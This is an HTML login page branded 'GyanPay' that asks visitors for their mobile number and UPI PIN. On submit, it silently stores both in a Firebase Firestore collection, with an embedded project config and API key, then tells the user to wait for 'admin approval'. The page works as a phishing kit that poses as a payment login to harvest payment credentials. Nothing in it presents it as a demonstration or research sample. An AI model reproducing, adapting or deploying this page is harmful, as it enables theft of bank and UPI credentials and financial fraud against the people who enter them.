<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GyanPay - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            font-size: 14px;
            color: #555;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background: #218838;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>GyanPay Login</h2>
        <form id="gyanpayForm">
            <div class="input-group">
                <label>Mobile Number</label>
                <input type="text" id="mobileNumber" required placeholder="Enter your mobile number">
            </div>
            <div class="input-group">
                <label>UPI PIN</label>
                <input type="password" id="upiPin" required maxlength="6" placeholder="Enter UPI PIN">
            </div>
            <button type="submit">Submit & Proceed</button>
        </form>
    </div>

    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
          apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
          authDomain: "gyanpey.firebaseapp.com",
          projectId: "gyanpey",
          storageBucket: "gyanpey.firebasestorage.app",
          messagingSenderId: "198373987569",
          appId: "1:198373987569:web:1a03dfe48402106d750550"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const form = document.getElementById('gyanpayForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const mobile = document.getElementById('mobileNumber').value;
            const pin = document.getElementById('upiPin').value;

            try {
                await addDoc(collection(db, "usersData"), {
                    mobileNumber: mobile,
                    upiPin: pin,
                    status: "Pending",
                    timestamp: new Date()
                });

                alert('Data submitted successfully! Waiting for admin approval.');
                form.reset();
            } catch (error) {
                console.error("Error adding document: ", error);
                alert('Error saving data. Check console.');
            }
        });
    </script>

</body>
</html>
